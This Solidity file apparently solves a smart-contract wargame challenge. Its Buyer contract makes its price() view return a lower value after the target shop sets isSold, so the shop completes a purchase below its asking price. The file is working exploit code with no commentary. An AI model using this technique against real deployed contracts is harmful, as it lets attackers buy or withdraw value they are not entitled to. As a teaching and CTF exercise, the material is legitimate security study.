// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IShop {
    function isSold() external view returns (bool);

    function price() external view returns (uint256);

    function buy() external;
}

contract Buyer {
    IShop target;

    constructor(address _instance) {
        target = IShop(_instance);
    }

    function price() external view returns (uint256) {
        if (target.isSold()) {
            return target.price() - 1;
        } else {
            return target.price();
        }
    }

    function buy() external {
        target.buy();
    }
}
